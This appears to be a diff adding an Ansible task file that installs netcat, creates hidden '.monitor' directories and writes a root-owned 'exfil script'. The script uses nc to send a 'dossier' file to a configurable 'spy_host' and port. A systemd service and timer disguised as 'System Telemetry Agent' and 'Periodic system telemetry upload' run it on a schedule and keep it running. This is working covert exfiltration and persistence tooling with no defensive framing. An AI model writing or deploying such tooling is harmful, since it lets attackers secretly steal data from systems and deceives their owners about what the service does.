@@ -1,0 +1,84 @@
+---
+- name: Install netcat
+  apt:
+    name: netcat-openbsd
+    state: present
+    update_cache: yes
+
+- name: Ensure hidden directories exist
+  file:
+    path: "{{ item }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+  loop:
+    - /usr/local/lib/.monitor
+    - /var/lib/.monitor
+
+- name: Create exfil script
+  copy:
+    dest: "{{ exfil_script_path }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/sh
+      set -eu
+
+      LOG="{{ exfil_log }}"
+      SPY="{{ spy_host }}"
+      PORT="{{ spy_port }}"
+      DOSSIER="{{ dossier_path }}"
+
+      echo "---- $(date) ----" >> "$LOG"
+
+      if [ -f "$DOSSIER" ]; then
+        nc -w 15 "$SPY" "$PORT" < "$DOSSIER" 2>/dev/null || true
+        echo "dossier sent to $SPY:$PORT ($(wc -l < "$DOSSIER") lines)" >> "$LOG"
+      else
+        echo "no dossier to send" >> "$LOG"
+      fi
+
+- name: Create exfil systemd service
+  copy:
+    dest: "/etc/systemd/system/{{ exfil_service_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=System Telemetry Agent
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart={{ exfil_script_path }}
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create exfil systemd timer
+  copy:
+    dest: "/etc/systemd/system/{{ exfil_timer_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Periodic system telemetry upload
+
+      [Timer]
+      OnCalendar={{ exfil_schedule }}
+      Persistent=true
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Enable and start exfil timer
+  systemd:
+    name: "{{ exfil_timer_unit }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
